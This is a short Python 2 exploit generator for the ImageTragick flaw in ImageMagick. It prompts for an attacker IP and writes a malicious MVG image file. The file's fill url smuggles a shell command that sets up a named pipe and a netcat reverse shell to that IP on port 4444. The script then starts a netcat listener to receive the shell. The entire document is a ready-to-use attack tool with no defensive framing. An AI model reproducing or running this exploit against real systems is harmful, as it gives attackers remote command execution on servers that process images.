print """
                      o                      o    
o                     |               o      | /  
  o-O-o  oo o--o o-o -o- o-o  oo o--o    o-o OO   
| | | | | | |  | |-'  |  |   | | |  | | |    | \  
| o o o o-o-o--O o-o  o  o   o-o-o--O |  o-o o  o 
               |                    |             
            o--o                 o--o             

[+]Code by Vishwaraj- @vishwaraj101          \n"""

import os #os module

print "[+]Creating imagetragick exploit \n"
ip=raw_input("Enter Reverse Ip>>> ")

#exploit code
code="""push graphic-context 

viewbox 0 0 640 480

fill 'url(https://example.com/image.jpg"|mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc %s 4444 1>/tmp/pipez;rm -rf "/tmp/pipez)'

pop graphic-context

"""%(ip)

try:
	f=file("imagik.mvg","w")
	f.write(code)
	f.close()
	print "[+]exploit created imagik.mvg \n "
	print "[+]Waiting for reverse shell at 4444 ...\n "
	os.system("nc -l 4444")

except:
  print "Cannot write the file"



